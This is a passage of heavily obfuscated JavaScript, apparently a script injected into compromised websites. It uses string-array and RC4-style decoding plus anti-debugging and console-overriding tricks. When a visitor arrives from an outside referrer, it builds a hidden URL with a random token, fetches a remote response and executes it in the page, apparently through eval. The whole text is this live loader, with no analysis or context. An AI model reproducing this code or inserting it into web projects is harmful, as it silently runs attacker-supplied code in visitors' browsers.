'ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};